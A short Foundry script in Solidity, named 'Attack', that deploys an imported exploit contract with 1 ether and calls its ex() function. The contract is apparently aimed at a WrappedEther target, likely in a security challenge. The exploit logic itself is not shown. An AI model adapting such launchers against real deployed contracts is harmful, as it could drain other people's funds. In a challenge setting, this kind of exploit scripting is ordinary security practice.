// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script, console} from "forge-std/Script.sol";
import "../src/WrappedEther/src/ex.sol";

contract Attack is Script {
    function setUp() public {

    }

    function run() public {
        vm.startBroadcast();

        exploit attacker = new exploit{value: 1 ether}();
        attacker.ex();

        vm.stopBroadcast();
    }
}